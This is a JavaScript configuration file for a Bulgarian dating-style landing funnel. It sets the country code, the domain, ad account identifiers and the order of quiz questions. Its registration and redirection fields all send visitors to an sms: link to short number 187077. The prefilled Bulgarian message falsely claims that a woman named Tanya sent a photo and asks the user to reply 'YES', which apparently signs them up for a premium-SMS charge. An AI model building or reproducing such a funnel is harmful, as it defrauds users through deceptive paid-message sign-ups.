cCode = 'BG'; // if '' => reads cCode from folder name or query string, if 'IP' => reads cCode from IP address, or set manually

datingApp = 'sms:187077?;&body=MEGA Таня ви изпрати снимка и покана отговори с ДА и я приеми';
regRoute = 'sms:187077?;&body=MEGA Таня ви изпрати снимка и покана отговори с ДА и я приеми'; // set custom reg route, default is /register-user-terminal
emailOnly = 1; // 1 to activate email only mode, default null
googleBtnText = ''; // set custom text or default text if empty
redirection = 'sms:187077?;&body=MEGA Таня ви изпрати снимка и покана отговори с ДА и я приеми'; // choose redirection to reg1 to finish registration
flow = false; // set auto picking dating app
cookieBar = false; // show/hide cookie bar
storeData = true; // choose to store data in local storage or not
giftCredits = null; // in this moment it will be null on frontend, maybe in the future we will give user some value to credit after register
accId = 'AW-350898554'; // familySafe only
accHash = 'H_RiCI-rw8ICEPqSqacB'; // familySafe only
domain = 'poluchime.com'; // set custom domain name in tos or leave empty for deafault
documentTitle = 'random'; // random for random title, set custom title or leave empty for default title
customTextUrl = ''; // define custom text file path


// company data - if string is empty, company will be NPG as default
companyName = '';
companyAddress = '';
companyRegNumber = '';
complianceEmail = '';


// choose which questions to render and reorder them at your will
questions = {
    startQ: true,
    fewQuestionsQ: true,
    identityQ: true,
    quickSexQ: true,
    // relationShipQ: true,
    // eyesColorQ: true,
    // hairColorQ: true,
    // skinColorQ: true,
    // physiqueLookQ: true,
    // heightQ: true,
    // weightQ: true,
    // aboutQ: true,
    // phoneQ: true,
    // userPassQ: true,
    // ageQ: true,
    // birthdateQ: true,
    // redirectStep: true,
    emailQ: true,
    // thanksQ:            true,
    finalQ: true,
}
